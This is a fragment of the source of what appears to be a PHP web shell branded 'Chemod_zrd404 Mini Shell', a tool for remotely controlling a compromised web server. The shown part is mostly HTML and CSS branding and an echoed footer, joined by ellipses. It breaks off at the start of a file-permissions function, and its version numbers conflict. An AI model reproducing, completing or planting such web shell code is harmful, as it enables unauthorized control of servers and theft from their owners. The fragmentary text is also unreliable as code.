<center><style size="4" type="text/css">b.drop-shadow { text-shadow: 2px 2px 3px black }</style><font size="30" color="Red"><b size="3"  class="drop-shadow"><b>Chemod_zrd404 Mini Shell</b></font></b><br></center>
...
<title>Chemod_zrd404 MiniShell V 2.0</title>
<style>
body{
    font-family: "Arial", cursive;
    background-image:url("https://i.pinimg.com/originals/8f/5d/78/8f5d789b9c0ad857c68f20a42133d4a8.jpg");
	color:white;
...
echo '<br /><center><font color="green">Chemod_zrd</font><font color="red">404</font><font color="green"> Mini Sell</font><font color="red"> V 4.4</center>
</BODY>
</HTML>';
function perms($file){
